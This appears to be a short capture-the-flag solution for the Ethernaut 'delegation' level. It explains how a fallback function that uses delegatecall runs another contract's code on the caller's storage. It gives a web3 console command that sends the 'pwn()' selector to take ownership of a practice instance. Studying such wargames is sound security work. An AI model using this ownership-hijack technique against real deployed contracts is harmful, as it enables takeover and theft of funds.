// => Player address 0x0718eccf37de50e31620C658B2c96adDc1e76300
// => Ethernaut address 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33
// => Instance address 0x2ED1C4A397c925AAa3FFFca879A4097B86CB023B

// solution

// the "data" parameter will be msg.data and should be an ABI encoded information
// with sendTransaction, we call the contract fallback
// then the delegatecall, will run the delegated contract's code, with the caller contract's storage (memory state), msg.sender and msg.value values
await contract.sendTransaction({ data: web3.eth.abi.encodeFunctionSignature('pwn()') });